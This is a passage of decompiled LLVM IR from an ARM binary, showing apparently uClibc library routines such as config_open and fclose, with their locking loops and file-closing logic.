dec_label_pc_15a44:                               ; preds = %entry, %bb6
  %v1_15a48 = phi i32 [ 0, %entry ], [ %v0_15a40, %bb6 ]
  ret i32 %v1_15a48

; uselistorder directives
  uselistorder label %dec_label_pc_15a44, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15a58 = load i32, i32* @r4, align 4
  store i32 %v3_15a58, i32* %stack_var_-8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 -33972), i32* @r1, align 4
  %v0_15a60 = call i32 @__GI_fopen()
  store i32 %v0_15a60, i32* %r0.global-to-local, align 4
  store i32 %v0_15a60, i32* @r4, align 4
  %v2_15a64 = icmp eq i32 %v0_15a60, 0
  br i1 %v2_15a64, label %bb, label %dec_label_pc_15a70

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_15a70:                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_15a78 = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_15a78, i32* %r0.global-to-local, align 4
  %v2_15a7c = icmp eq i32 %v2_15a78, 0
  br i1 %v2_15a7c, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_15a70
  %v1_15a80 = load i32, i32* @r4, align 4
  %v3_15a80 = inttoptr i32 %v2_15a78 to i32*
  store i32 %v1_15a80, i32* %v3_15a80, align 4
  %v1_15a88.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_15a70, %bb4
  %v1_15a88 = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_15a70 ], [ %v1_15a88.pre, %bb4 ]
  %v2_15a84 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15a84, i32* @r4, align 4
  ret i32 %v1_15a88

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32 (i32, i32)* @calloc, { 41, 38, 39, 40, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 0, 26, 25, 24, 23, 22, 2, 1, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_15a94 = load i32, i32* @r4, align 4
  store i32 %v3_15a94, i32* %stack_var_-36, align 4
  %v6_15a94 = load i32, i32* @r5, align 4
  %v9_15a94 = load i32, i32* @r6, align 4
  %v12_15a94 = load i32, i32* @r7, align 4
  %v2_15a98 = add i32 %tmp, 52
  %v3_15a98 = inttoptr i32 %v2_15a98 to i32*
  %v4_15a98 = load i32, i32* %v3_15a98, align 4
  store i32 %v4_15a98, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15aa0 = icmp eq i32 %v4_15a98, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* @r8, align 4
  br i1 %v2_15aa0, label %dec_label_pc_15ab4, label %dec_label_pc_15b18

dec_label_pc_15ab4:                               ; preds = %entry
  %v0_15ab4 = call i32 @__aeabi_read_tp()
  store i32 %v0_15ab4, i32* %r0.global-to-local, align 4
  %v0_15ab8 = load i32, i32* @r5, align 4
  %v1_15ab8 = add i32 %v0_15ab8, 64
  %v2_15ab8 = inttoptr i32 %v1_15ab8 to i32*
  %v3_15ab8 = load i32, i32* %v2_15ab8, align 4
  store i32 %v3_15ab8, i32* %r3.global-to-local, align 4
  %v1_15abc = add i32 %v0_15ab4, -1168
  store i32 %v1_15abc, i32* @r6, align 4
  %v3_15ac0 = icmp uge i32 %v3_15ab8, %v1_15abc
  store i1 %v3_15ac0, i1* %cpsr_c.global-to-local, align 1
  %v9_15ac0 = icmp eq i32 %v3_15ab8, %v1_15abc
  br i1 %v9_15ac0, label %dec_label_pc_15b0c, label %dec_label_pc_15ac8

dec_label_pc_15ac8:                               ; preds = %dec_label_pc_15ab4
  %v1_15ac8 = add i32 %v0_15ab8, 56
  store i32 %v1_15ac8, i32* @r7, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v1_15ac8, i32* %r2.global-to-local, align 4
  %v0_15ad4 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_15ad4, i32* @r4, align 4
  %v1_15ad8115 = inttoptr i32 %v1_15ac8 to i32*
  %v2_15ad8116 = load i32, i32* %v1_15ad8115, align 4
  store i32 %v2_15ad8116, i32* %r3.global-to-local, align 4
  %v3_15adc118 = icmp uge i32 %v2_15ad8116, %v0_15ad4
  store i1 %v3_15adc118, i1* %cpsr_c.global-to-local, align 1
  %v9_15adc124 = icmp eq i32 %v2_15ad8116, %v0_15ad4
  br i1 %v9_15adc124, label %dec_label_pc_15ae4, label %dec_label_pc_15afc

dec_label_pc_15ae4:                               ; preds = %dec_label_pc_15ac8, %dec_label_pc_15ae4.dec_label_pc_15ad8_crit_edge
  %v0_15ae4125 = phi i32 [ %v1_15adc.pre, %dec_label_pc_15ae4.dec_label_pc_15ad8_crit_edge ], [ %v0_15ad4, %dec_label_pc_15ac8 ]
  store i32 %v0_15ae4125, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15af4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15af4, label %dec_label_pc_15af8, label %dec_label_pc_15ae4.dec_label_pc_15ad8_crit_edge

dec_label_pc_15ae4.dec_label_pc_15ad8_crit_edge:  ; preds = %dec_label_pc_15ae4
  %v0_15ad8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15adc.pre = load i32, i32* @r4, align 4
  %v1_15ad8 = inttoptr i32 %v0_15ad8.pre to i32*
  %v2_15ad8 = load i32, i32* %v1_15ad8, align 4
  store i32 %v2_15ad8, i32* %r3.global-to-local, align 4
  %v3_15adc = icmp uge i32 %v2_15ad8, %v1_15adc.pre
  store i1 %v3_15adc, i1* %cpsr_c.global-to-local, align 1
  %v9_15adc = icmp eq i32 %v2_15ad8, %v1_15adc.pre
  br i1 %v9_15adc, label %dec_label_pc_15ae4, label %dec_label_pc_15afc

dec_label_pc_15af8:                               ; preds = %dec_label_pc_15ae4
  %v0_15af8 = load i32, i32* @r4, align 4
  store i32 %v0_15af8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15afc

dec_label_pc_15afc:                               ; preds = %dec_label_pc_15ac8, %dec_label_pc_15ae4.dec_label_pc_15ad8_crit_edge, %dec_label_pc_15af8
  %v0_15afc = phi i32 [ %v0_15af8, %dec_label_pc_15af8 ], [ %v2_15ad8116, %dec_label_pc_15ac8 ], [ %v2_15ad8, %dec_label_pc_15ae4.dec_label_pc_15ad8_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15afc = icmp eq i32 %v0_15afc, 0
  br i1 %v2_15afc, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_15afc
  %v1_15b00 = load i32, i32* @r7, align 4
  store i32 %v1_15b00, i32* %r0.global-to-local, align 4
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_15afc, %bb
  %v1_15b04 = xor i1 %v2_15afc, true
  call void @__pseudo_cond_branch(i1 %v1_15b04, i32 ptrtoint (i32* @global_var_142c4.496 to i32))
  %v0_15b08 = load i32, i32* @r6, align 4
  %v1_15b08 = load i32, i32* @r5, align 4
  %v2_15b08 = add i32 %v1_15b08, 64
  %v3_15b08 = inttoptr i32 %v2_15b08 to i32*
  store i32 %v0_15b08, i32* %v3_15b08, align 4
  %v0_15b0c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15b0c

dec_label_pc_15b0c:                               ; preds = %dec_label_pc_15ab4, %bb41
  %v0_15b0c = phi i32 [ %v0_15ab8, %dec_label_pc_15ab4 ], [ %v0_15b0c.pre, %bb41 ]
  %v1_15b0c = add i32 %v0_15b0c, 60
  %v2_15b0c = inttoptr i32 %v1_15b0c to i32*
  %v3_15b0c = load i32, i32* %v2_15b0c, align 4
  %v1_15b10 = add i32 %v3_15b0c, 1
  store i32 %v1_15b10, i32* %r3.global-to-local, align 4
  store i32 %v1_15b10, i32* %v2_15b0c, align 4
  %v0_15b18.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15b18

dec_label_pc_15b18:                               ; preds = %entry, %dec_label_pc_15b0c
  %v1_15b20 = phi i32 [ %tmp, %entry ], [ %v0_15b18.pre, %dec_label_pc_15b0c ]
  %v1_15b18 = inttoptr i32 %v1_15b20 to i16*
  %v2_15b18 = load i16, i16* %v1_15b18, align 2
  %v3_15b18 = zext i16 %v2_15b18 to i32
  store i32 %v3_15b18, i32* %r3.global-to-local, align 4
  %v1_15b1c = and i32 %v3_15b18, 64
  %v2_15b1c = icmp eq i32 %v1_15b1c, 0
  br i1 %v2_15b1c, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_15b18
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_15b18, %bb42
  %storemerge = phi i32 [ %v1_15b20, %bb42 ], [ %v1_15b1c, %dec_label_pc_15b18 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 88872, i32* @lr, align 4
  %v1_15b24 = xor i1 %v2_15b1c, true
  call void @__pseudo_cond_branch(i1 %v1_15b24, i32 ptrtoint (i32* @global_var_16968.587 to i32))
  %v0_15b28 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15b28, i32* %fp.global-to-local, align 4
  %v0_15b2c = load i32, i32* @r5, align 4
  %v1_15b2c = add i32 %v0_15b2c, 4
  %v2_15b2c = inttoptr i32 %v1_15b2c to i32*
  %v3_15b2c = load i32, i32* %v2_15b2c, align 4
  store i32 %v3_15b2c, i32* %r0.global-to-local, align 4
  %v1_15b30 = call i32 @__GI___libc_close(i32 %v3_15b2c)
  store i32 %v1_15b30, i32* %r0.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_15b38 = load i32, i32* @r8, align 4
  %v2_15b38 = add i32 %v0_15b38, 160
  %v3_15b38 = inttoptr i32 %v2_15b38 to i32*
  %v4_15b38 = load i32, i32* %v3_15b38, align 4
  store i32 %v4_15b38, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_15b3c = icmp slt i32 %v1_15b30, 0
  br i1 %v1_15b3c, label %bb44, label %bb45

bb44:                                             ; preds = %bb43
  store i32 -1, i32* %fp.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %bb43, %bb44
  %v1_15b44 = add i32 %v4_15b38, 8
  %v2_15b44 = inttoptr i32 %v1_15b44 to i32*
  %v3_15b44 = load i32, i32* %v2_15b44, align 4
  store i32 %v3_15b44, i32* %r3.global-to-local, align 4
  %v0_15b48 = call i32 @__aeabi_read_tp()
  store i32 %v0_15b48, i32* %r0.global-to-local, align 4
  %v1_15b4c = add i32 %v0_15b48, -1168
  store i32 %v1_15b4c, i32* %sl.global-to-local, align 4
  %v0_15b50 = load i32, i32* %r3.global-to-local, align 4
  %v3_15b50 = icmp uge i32 %v0_15b50, %v1_15b4c
  store i1 %v3_15b50, i1* %cpsr_c.global-to-local, align 1
  %v9_15b50 = icmp eq i32 %v0_15b50, %v1_15b4c
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_15b58 = load i32, i32* @r5, align 4
  %v2_15b58 = add i32 %v1_15b58, 4
  %v3_15b58 = inttoptr i32 %v2_15b58 to i32*
  store i32 -1, i32* %v3_15b58, align 4
  br i1 %v9_15b50, label %dec_label_pc_15ba0, label %dec_label_pc_15b60

dec_label_pc_15b60:                               ; preds = %bb45
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_15b64 = load i32, i32* @r7, align 4
  store i32 %v0_15b64, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_15b6c108 = inttoptr i32 %v0_15b64 to i32*
  %v2_15b6c109 = load i32, i32* %v1_15b6c108, align 4
  store i32 %v2_15b6c109, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_15b70111 = icmp eq i32 %v2_15b6c109, 0
  br i1 %v9_15b70111, label %dec_label_pc_15b78, label %dec_label_pc_15b90

dec_label_pc_15b78:                               ; preds = %dec_label_pc_15b60, %dec_label_pc_15b78.dec_label_pc_15b6c_crit_edge
  %v0_15b78112 = phi i32 [ %v1_15b70.pre, %dec_label_pc_15b78.dec_label_pc_15b6c_crit_edge ], [ 0, %dec_label_pc_15b60 ]
  store i32 %v0_15b78112, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15b88 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15b88, label %dec_label_pc_15b8c, label %dec_label_pc_15b78.dec_label_pc_15b6c_crit_edge

dec_label_pc_15b78.dec_label_pc_15b6c_crit_edge:  ; preds = %dec_label_pc_15b78
  %v0_15b6c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15b70.pre = load i32, i32* @r4, align 4
  %v1_15b6c = inttoptr i32 %v0_15b6c.pre to i32*
  %v2_15b6c = load i32, i32* %v1_15b6c, align 4
  store i32 %v2_15b6c, i32* %r3.global-to-local, align 4
  %v3_15b70 = icmp uge i32 %v2_15b6c, %v1_15b70.pre
  store i1 %v3_15b70, i1* %cpsr_c.global-to-local, align 1
  %v9_15b70 = icmp eq i32 %v2_15b6c, %v1_15b70.pre
  br i1 %v9_15b70, label %dec_label_pc_15b78, label %dec_label_pc_15b90

dec_label_pc_15b8c:                               ; preds = %dec_label_pc_15b78
  %v0_15b8c = load i32, i32* @r4, align 4
  store i32 %v0_15b8c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15b90

dec_label_pc_15b90:                               ; preds = %dec_label_pc_15b60, %dec_label_pc_15b78.dec_label_pc_15b6c_crit_edge, %dec_label_pc_15b8c
  %v0_15b90 = phi i32 [ %v0_15b8c, %dec_label_pc_15b8c ], [ %v2_15b6c109, %dec_label_pc_15b60 ], [ %v2_15b6c, %dec_label_pc_15b78.dec_label_pc_15b6c_crit_edge ]
  %v1_15b90 = phi i32 [ %v0_15b8c, %dec_label_pc_15b8c ], [ 0, %dec_label_pc_15b60 ], [ %v1_15b70.pre, %dec_label_pc_15b78.dec_label_pc_15b6c_crit_edge ]
  %v3_15b90 = icmp uge i32 %v0_15b90, %v1_15b90
  store i1 %v3_15b90, i1* %cpsr_c.global-to-local, align 1
  %v9_15b90 = icmp eq i32 %v0_15b90, %v1_15b90
  br i1 %v9_15b90, label %bb47, label %bb46

bb46:                                             ; preds = %dec_label_pc_15b90
  %v1_15b94 = load i32, i32* @r7, align 4
  store i32 %v1_15b94, i32* %r0.global-to-local, align 4
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_15b90, %bb46
  %v1_15b98 = xor i1 %v9_15b90, true
  call void @__pseudo_cond_branch(i1 %v1_15b98, i32 ptrtoint (i32* @global_var_142c4.496 to i32))
  %v0_15b9c = load i32, i32* %sl.global-to-local, align 4
  %v1_15b9c = load i32, i32* @r7, align 4
  %v2_15b9c = add i32 %v1_15b9c, 8
  %v3_15b9c = inttoptr i32 %v2_15b9c to i32*
  store i32 %v0_15b9c, i32* %v3_15b9c, align 4
  br label %dec_label_pc_15ba0

dec_label_pc_15ba0:                               ; preds = %bb45, %bb47
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_15ba4 = load i32, i32* @r8, align 4
  %v2_15ba4 = add i32 %v0_15ba4, 160
  %v3_15ba4 = inttoptr i32 %v2_15ba4 to i32*
  %v4_15ba4 = load i32, i32* %v3_15ba4, align 4
  store i32 %v4_15ba4, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_15bac = add i32 %v0_15ba4, 12
  %v3_15bac = inttoptr i32 %v2_15bac to i32*
  %v4_15bac = load i32, i32* %v3_15bac, align 4
  store i32 %v4_15bac, i32* %r2.global-to-local, align 4
  %v1_15bb0 = add i32 %v4_15ba4, 4
  %v2_15bb0 = inttoptr i32 %v1_15bb0 to i32*
  %v3_15bb0 = load i32, i32* %v2_15bb0, align 4
  store i32 %v3_15bb0, i32* %r1.global-to-local, align 4
  %v1_15bb4 = inttoptr i32 %v4_15bac to i32*
  %v2_15bb4 = load i32, i32* %v1_15bb4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15bb8 = icmp eq i32 %v3_15bb0, 0
  %v1_15bbc = add i32 %v2_15bb4, 1
  store i32 %v1_15bbc, i32* %r3.global-to-local, align 4
  store i32 %v1_15bbc, i32* %v1_15bb4, align 4
  br i1 %v2_15bb8, label %dec_label_pc_15bc8, label %dec_label_pc_15c28

dec_label_pc_15bc8:                               ; preds = %dec_label_pc_15ba0
  %v0_15bc8 = load i32, i32* %r1.global-to-local, align 4
  %v1_15bc8 = load i32, i32* %r0.global-to-local, align 4
  %v2_15bc8 = add i32 %v1_15bc8, 8
  %v3_15bc8 = inttoptr i32 %v2_15bc8 to i32*
  store i32 %v0_15bc8, i32* %v3_15bc8, align 4
  %v0_15bcc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15bcc, i32* @r7, align 4
  br label %dec_label_pc_15bd0

dec_label_pc_15bd0:                               ; preds = %dec_label_pc_15c00.dec_label_pc_15bd0_crit_edge, %dec_label_pc_15bc8
  %v0_15bd0 = phi i32 [ %v0_15bd0.pre, %dec_label_pc_15c00.dec_label_pc_15bd0_crit_edge ], [ %v0_15bcc, %dec_label_pc_15bc8 ]
  %v1_15bd0 = inttoptr i32 %v0_15bd0 to i32*
  %v2_15bd0 = load i32, i32* %v1_15bd0, align 4
  store i32 %v2_15bd0, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_15bd0, i32* %r2.global-to-local, align 4
  %v2_15bdc96 = load i32, i32* %v1_15bd0, align 4
  store i32 %v2_15bdc96, i32* %r3.global-to-local, align 4
  %v3_15be098 = icmp uge i32 %v2_15bdc96, %v2_15bd0
  store i1 %v3_15be098, i1* %cpsr_c.global-to-local, align 1
  %v9_15be0104 = icmp eq i32 %v2_15bdc96, %v2_15bd0
  br i1 %v9_15be0104, label %dec_label_pc_15be8, label %dec_label_pc_15c00

dec_label_pc_15be8:                               ; preds = %dec_label_pc_15bd0, %dec_label_pc_15be8.dec_label_pc_15bdc_crit_edge
  %v0_15be8105 = phi i32 [ %v1_15be0.pre, %dec_label_pc_15be8.dec_label_pc_15bdc_crit_edge ], [ %v2_15bd0, %dec_label_pc_15bd0 ]
  store i32 %v0_15be8105, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15bf8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15bf8, label %dec_label_pc_15bfc, label %dec_label_pc_15be8.dec_label_pc_15bdc_crit_edge

dec_label_pc_15be8.dec_label_pc_15bdc_crit_edge:  ; preds = %dec_label_pc_15be8
  %v0_15bdc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15be0.pre = load i32, i32* @r4, align 4
  %v1_15bdc = inttoptr i32 %v0_15bdc.pre to i32*
  %v2_15bdc = load i32, i32* %v1_15bdc, align 4
  store i32 %v2_15bdc, i32* %r3.global-to-local, align 4
  %v3_15be0 = icmp uge i32 %v2_15bdc, %v1_15be0.pre
  store i1 %v3_15be0, i1* %cpsr_c.global-to-local, align 1
  %v9_15be0 = icmp eq i32 %v2_15bdc, %v1_15be0.pre
  br i1 %v9_15be0, label %dec_label_pc_15be8, label %dec_label_pc_15c00

dec_label_pc_15bfc:                               ; preds = %dec_label_pc_15be8
  %v0_15bfc = load i32, i32* @r4, align 4
  store i32 %v0_15bfc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15c00

dec_label_pc_15c00:                               ; preds = %dec_label_pc_15bd0, %dec_label_pc_15be8.dec_label_pc_15bdc_crit_edge, %dec_label_pc_15bfc
  %v0_15c08 = phi i32 [ %v0_15bfc, %dec_label_pc_15bfc ], [ %v2_15bdc96, %dec_label_pc_15bd0 ], [ %v2_15bdc, %dec_label_pc_15be8.dec_label_pc_15bdc_crit_edge ]
  %v1_15c00 = phi i32 [ %v0_15bfc, %dec_label_pc_15bfc ], [ %v2_15bd0, %dec_label_pc_15bd0 ], [ %v1_15be0.pre, %dec_label_pc_15be8.dec_label_pc_15bdc_crit_edge ]
  %v3_15c00 = icmp uge i32 %v0_15c08, %v1_15c00
  store i1 %v3_15c00, i1* %cpsr_c.global-to-local, align 1
  %v9_15c00 = icmp eq i32 %v0_15c08, %v1_15c00
  br i1 %v9_15c00, label %dec_label_pc_15c08, label %dec_label_pc_15c00.dec_label_pc_15bd0_crit_edge

dec_label_pc_15c00.dec_label_pc_15bd0_crit_edge:  ; preds = %dec_label_pc_15c00
  %v0_15bd0.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_15bd0

dec_label_pc_15c08:                               ; preds = %dec_label_pc_15c00
  %v2_15c08 = icmp ne i32 %v1_15c00, 0
  store i1 %v2_15c08, i1* %cpsr_c.global-to-local, align 1
  %v7_15c0c = icmp slt i32 %v1_15c00, 2
  br i1 %v7_15c0c, label %dec_label_pc_15c28, label %dec_label_pc_15c10

dec_label_pc_15c10:                               ; preds = %dec_label_pc_15c08
  %v0_15c10 = load i32, i32* @r7, align 4
  store i32 %v0_15c10, i32* %r0.global-to-local, align 4
  %v0_15c14 = load i32, i32* %r1.global-to-local, align 4
  %v1_15c14 = add i32 %v0_15c14, 129
  store i32 %v1_15c14, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15c28

dec_label_pc_15c28:                               ; preds = %dec_label_pc_15ba0, %dec_label_pc_15c10, %dec_label_pc_15c08
  %v0_15c28 = load i32, i32* @r5, align 4
  %v1_15c28 = inttoptr i32 %v0_15c28 to i16*
  %v2_15c28 = load i16, i16* %v1_15c28, align 2
  %v3_15c28 = zext i16 %v2_15c28 to i32
  %v1_15c2c = and i32 %v3_15c28, 24576
  %v1_15c30 = or i32 %v1_15c2c, 48
  store i32 %v1_15c30, i32* %r3.global-to-local, align 4
  %v0_15c34 = load i32, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15c34 = icmp eq i32 %v0_15c34, 0
  %v1_15c38 = trunc i32 %v1_15c30 to i16
  store i16 %v1_15c38, i16* %v1_15c28, align 2
  br i1 %v2_15c34, label %dec_label_pc_15c40, label %dec_label_pc_15cb4

dec_label_pc_15c40:                               ; preds = %dec_label_pc_15c28
  %v0_15c40 = load i32, i32* @r5, align 4
  %v1_15c40 = add i32 %v0_15c40, 60
  %v2_15c40 = inttoptr i32 %v1_15c40 to i32*
  %v3_15c40 = load i32, i32* %v2_15c40, align 4
  %v1_15c44 = add i32 %v3_15c40, -1
  store i32 %v1_15c44, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15c48 = icmp eq i32 %v1_15c44, 0
  store i32 %v1_15c44, i32* %v2_15c40, align 4
  br i1 %v2_15c48, label %dec_label_pc_15c54, label %dec_label_pc_15cb4

dec_label_pc_15c54:                               ; preds = %dec_label_pc_15c40
  %v0_15c54 = load i32, i32* %r3.global-to-local, align 4
  %v1_15c54 = load i32, i32* @r5, align 4
  %v2_15c54 = add i32 %v1_15c54, 64
  %v3_15c54 = inttoptr i32 %v2_15c54 to i32*
  store i32 %v0_15c54, i32* %v3_15c54, align 4
  %v0_15c58 = load i32, i32* @r5, align 4
  %v1_15c58 = add i32 %v0_15c58, 56
  store i32 %v1_15c58, i32* @r6, align 4
  br label %dec_label_pc_15c5c

dec_label_pc_15c5c:                               ; preds = %dec_label_pc_15c8c.dec_label_pc_15c5c_crit_edge, %dec_label_pc_15c54
  %v0_15c64 = phi i32 [ %v0_15c64.pre, %dec_label_pc_15c8c.dec_label_pc_15c5c_crit_edge ], [ %v1_15c58, %dec_label_pc_15c54 ]
  %v0_15c5c = phi i32 [ %v0_15c5c.pre, %dec_label_pc_15c8c.dec_label_pc_15c5c_crit_edge ], [ %v0_15c58, %dec_label_pc_15c54 ]
  %v1_15c5c = add i32 %v0_15c5c, 56
  %v2_15c5c = inttoptr i32 %v1_15c5c to i32*
  %v3_15c5c = load i32, i32* %v2_15c5c, align 4
  store i32 %v3_15c5c, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_15c64, i32* %r2.global-to-local, align 4
  %v1_15c6882 = inttoptr i32 %v0_15c64 to i32*
  %v2_15c6883 = load i32, i32* %v1_15c6882, align 4
  store i32 %v2_15c6883, i32* %r3.global-to-local, align 4
  %v3_15c6c85 = icmp uge i32 %v2_15c6883, %v3_15c5c
  store i1 %v3_15c6c85, i1* %cpsr_c.global-to-local, align 1
  %v9_15c6c91 = icmp eq i32 %v2_15c6883, %v3_15c5c
  br i1 %v9_15c6c91, label %dec_label_pc_15c74, label %dec_label_pc_15c8c

dec_label_pc_15c74:                               ; preds = %dec_label_pc_15c5c, %dec_label_pc_15c74.dec_label_pc_15c68_crit_edge
  %v0_15c7492 = phi i32 [ %v1_15c6c.pre, %dec_label_pc_15c74.dec_label_pc_15c68_crit_edge ], [ %v3_15c5c, %dec_label_pc_15c5c ]
  store i32 %v0_15c7492, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15c84 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15c84, label %dec_label_pc_15c88, label %dec_label_pc_15c74.dec_label_pc_15c68_crit_edge

dec_label_pc_15c74.dec_label_pc_15c68_crit_edge:  ; preds = %dec_label_pc_15c74
  %v0_15c68.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15c6c.pre = load i32, i32* @r4, align 4
  %v1_15c68 = inttoptr i32 %v0_15c68.pre to i32*
  %v2_15c68 = load i32, i32* %v1_15c68, align 4
  store i32 %v2_15c68, i32* %r3.global-to-local, align 4
  %v3_15c6c = icmp uge i32 %v2_15c68, %v1_15c6c.pre
  store i1 %v3_15c6c, i1* %cpsr_c.global-to-local, align 1
  %v9_15c6c = icmp eq i32 %v2_15c68, %v1_15c6c.pre
  br i1 %v9_15c6c, label %dec_label_pc_15c74, label %dec_label_pc_15c8c

dec_label_pc_15c88:                               ; preds = %dec_label_pc_15c74
  %v0_15c88 = load i32, i32* @r4, align 4
  store i32 %v0_15c88, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15c8c

dec_label_pc_15c8c:                               ; preds = %dec_label_pc_15c5c, %dec_label_pc_15c74.dec_label_pc_15c68_crit_edge, %dec_label_pc_15c88
  %v0_15c94 = phi i32 [ %v0_15c88, %dec_label_pc_15c88 ], [ %v2_15c6883, %dec_label_pc_15c5c ], [ %v2_15c68, %dec_label_pc_15c74.dec_label_pc_15c68_crit_edge ]
  %v1_15c8c = phi i32 [ %v0_15c88, %dec_label_pc_15c88 ], [ %v3_15c5c, %dec_label_pc_15c5c ], [ %v1_15c6c.pre, %dec_label_pc_15c74.dec_label_pc_15c68_crit_edge ]
  %v3_15c8c = icmp uge i32 %v0_15c94, %v1_15c8c
  store i1 %v3_15c8c, i1* %cpsr_c.global-to-local, align 1
  %v9_15c8c = icmp eq i32 %v0_15c94, %v1_15c8c
  br i1 %v9_15c8c, label %dec_label_pc_15c94, label %dec_label_pc_15c8c.dec_label_pc_15c5c_crit_edge

dec_label_pc_15c8c.dec_label_pc_15c5c_crit_edge:  ; preds = %dec_label_pc_15c8c
  %v0_15c5c.pre = load i32, i32* @r5, align 4
  %v0_15c64.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15c5c

dec_label_pc_15c94:                               ; preds = %dec_label_pc_15c8c
  %v2_15c94 = icmp ne i32 %v1_15c8c, 0
  store i1 %v2_15c94, i1* %cpsr_c.global-to-local, align 1
  %v7_15c98 = icmp slt i32 %v1_15c8c, 2
  br i1 %v7_15c98, label %dec_label_pc_15cb4, label %dec_label_pc_15c9c

dec_label_pc_15c9c:                               ; preds = %dec_label_pc_15c94
  %v0_15c9c = load i32, i32* @r5, align 4
  %v1_15c9c = add i32 %v0_15c9c, 56
  store i32 %v1_15c9c, i32* %r0.global-to-local, align 4
  %v0_15ca0 = load i32, i32* %r1.global-to-local, align 4
  %v1_15ca0 = add i32 %v0_15ca0, 129
  store i32 %v1_15ca0, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15cb4

dec_label_pc_15cb4:                               ; preds = %dec_label_pc_15c40, %dec_label_pc_15c28, %dec_label_pc_15c9c, %dec_label_pc_15c94
  %v0_15cb4 = load i32, i32* @r5, align 4
  %v1_15cb4 = inttoptr i32 %v0_15cb4 to i16*
